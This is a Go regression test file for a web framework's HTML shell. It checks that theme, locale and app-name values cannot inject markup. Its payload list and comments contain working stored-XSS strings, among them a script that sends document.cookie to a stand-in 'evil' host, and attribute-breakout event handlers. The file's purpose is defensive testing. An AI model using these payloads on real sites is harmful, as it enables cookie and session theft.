package server

import (
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/qorm/qorm/internal/model"
	"github.com/qorm/qorm/internal/runtime"
)

// The HTML shell used to interpolate two state-controlled values RAW:
//
//	<html lang="%s" dir="%s">                     <- rt.CurrentLocale() = state.locale
//	<div id="qorm-stage" class="qorm-theme-%s">   <- rt.CurrentTheme()  = state.theme
//
// Neither is a value the user types in the ordinary sense, but both are plain
// state keys, and QORM hands state writes to a lot of parties: an action's
// state.set, an http response merged into state, MCP qorm_set_state, and any
// theme/locale picker bound to an input. A write of
//
//	auto"></div><script>fetch('//evil/'+document.cookie)</script><div class="
//
// therefore became STORED XSS: it survives in state, and the next full page
// load (a refresh, a reconnect, a second tab, the console's iframe) executes it
// in the app's own origin — from where it can read the embedded event token out
// of the page and impersonate the human on /event for as long as the server
// runs. This file is the regression guard, end to end over real HTTP.

// shellPayloads are the red team's exact constructions plus the neighbouring
// shapes that would work if the fix only escaped one character.
var shellPayloads = []struct {
	name string
	val  string
}{
	{"stage-breakout-script", `auto"></div><script>fetch('//evil/'+document.cookie)</script><div class="`},
	{"attribute-breakout-handler", `auto" onmouseover="fetch('//evil')`},
	{"extra-class-no-quote-needed", `auto qorm-fluid`},
	{"tag-open", `auto<script>alert(1)</script>`},
	{"entity-smuggle", `auto&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;`},
}

func shellRuntime(t *testing.T, state map[string]any) *runtime.Runtime {
	t.Helper()
	return runtime.New(&model.App{
		Entry:       "main",
		Name:        "Shell",
		GlobalState: model.GlobalState{Initial: state},
		Scenes:      map[string]*model.Node{"main": {Type: "column", ID: "root"}},
	})
}

// shellPage serves one real GET / through the real handler and returns the
// body, so the assertion is about what a browser receives, not about a helper.
func shellPage(t *testing.T, rt *runtime.Runtime) string {
	t.Helper()
	ts := httptest.NewServer(New(rt).Handler())
	t.Cleanup(ts.Close)
	resp, err := http.Get(ts.URL + "/")
	if err != nil {
		t.Fatalf("GET /: %v", err)
	}
	defer resp.Body.Close()
	b, err := io.ReadAll(resp.Body)
	if err != nil {
		t.Fatalf("read body: %v", err)
	}
	return string(b)
}

// head trims a page for a readable failure message.
func head(s string) string {
	if len(s) > 400 {
		return s[:400] + " …"
	}
	return s
}

// assertNoInjection is the shared verdict: nothing the payload carries may
// appear as MARKUP, and the shell's own structure must be intact.
func assertNoInjection(t *testing.T, page, ctx string) {
	t.Helper()
	for _, bad := range []string{
		"<script>fetch(", "<script>alert(", "onmouseover=", "evil", "document.cookie",
	} {
		if strings.Contains(page, bad) {
			t.Errorf("%s: the payload reached the page as %q:\n%s", ctx, bad, head(page))
		}
	}
	if !strings.Contains(page, `<div id="qorm-stage" class="qorm-theme-`) {
		t.Errorf("%s: the stage element was mangled — the value escaped its attribute:\n%s", ctx, head(page))
	}
	if strings.Count(page, `<div id="qorm-stage"`) != 1 {
		t.Errorf("%s: the payload duplicated or destroyed the stage element", ctx)
	}
}

// TestShellThemeStoredXSS: state.theme lands in the stage's CSS class.
func TestShellThemeStoredXSS(t *testing.T) {
	for _, p := range shellPayloads {
		t.Run(p.name, func(t *testing.T) {
			page := shellPage(t, shellRuntime(t, map[string]any{"theme": p.val}))
			assertNoInjection(t, page, "state.theme="+p.name)
			// Rejected wholesale, not stripped into some third theme: the
			// documented default is what an unknown theme always rendered as.
			if !strings.Contains(page, `class="qorm-theme-auto"`) {
				t.Errorf("a theme that is not a CSS identifier must fall back to auto:\n%s", head(page))
			}
		})
	}
}

// TestShellLocaleStoredXSS: state.locale lands in <html lang="…">.
func TestShellLocaleStoredXSS(t *testing.T) {
	for _, p := range shellPayloads {
		t.Run(p.name, func(t *testing.T) {
			page := shellPage(t, shellRuntime(t, map[string]any{"locale": p.val}))
			assertNoInjection(t, page, "state.locale="+p.name)
			if !strings.Contains(page, `<html lang="en" dir="ltr">`) {
				t.Errorf("a locale that is not a language tag must fall back to en:\n%s", head(page))
			}
		})
	}
}

// TestShellThemeAndLocalePassLegitimateValues is the compatibility half: every
// value a real app uses must still reach the shell byte-identically, or the fix
// would have broken theming and i18n instead of securing them.
func TestShellThemeAndLocalePassLegitimateValues(t *testing.T) {
	for _, theme := range []string{"auto", "apple", "material", "dark", "my-brand", "brand_2"} {
		if got := themeClass(theme); got != theme {
			t.Errorf("themeClass(%q) = %q, want it unchanged", theme, got)
		}
	}
	if themeClass("") != "auto" {
		t.Error(`themeClass("") must be the documented default "auto"`)
	}
	for _, loc := range []string{"en", "zh", "ar", "he-IL", "zh-Hans-CN", "pt_BR"} {
		if got := langTag(loc); got != loc {
			t.Errorf("langTag(%q) = %q, want it unchanged", loc, got)
		}
	}
	for _, bad := range []string{"", "-en", "en-", "en--US", "en US", `en"`, strings.Repeat("a", 40)} {
		if got := langTag(bad); got != "en" {
			t.Errorf("langTag(%q) = %q, want the fallback \"en\"", bad, got)
		}
	}

	// RTL still keys off the (validated) locale end to end.
	page := shellPage(t, shellRuntime(t, map[string]any{"locale": "ar"}))
	if !strings.Contains(page, `<html lang="ar" dir="rtl">`) {
		t.Errorf("a legitimate RTL locale must still drive lang/dir:\n%s", head(page))
	}
}

// TestShellAppNameAttributeEscaping: htmlEscape feeds ATTRIBUTE positions too —
// the console's <iframe title="{{title}}"> and the offline shell's
// <meta content="…"> — so it must escape quotes, not only & < >. The manifest
// is author data and an OTA bundle replaces it wholesale.
func TestShellAppNameAttributeEscaping(t *testing.T) {
	got := htmlEscape(`Drag & Drop" onload="alert(1)`)
	for _, want := range []string{"&amp;", "&#34;"} {
		if !strings.Contains(got, want) {
			t.Errorf("htmlEscape(%q) = %q, must contain %q", `Drag & Drop" onload="alert(1)`, got, want)
		}
	}
	if strings.Contains(got, `"`) || strings.Contains(got, `'`) {
		t.Errorf("htmlEscape left a raw quote, which closes an attribute: %q", got)
	}

	// End to end: the window title rides htmlEscape into <title>.
	rt := runtime.New(&model.App{
		Entry: "main", Name: `Evil" onload="alert(1)`,
		Scenes: map[string]*model.Node{"main": {Type: "column", ID: "root"}},
	})
	page := shellPage(t, rt)
	if strings.Contains(page, `onload="alert(1)`) {
		t.Errorf("app name broke out of its context:\n%s", head(page))
	}
}
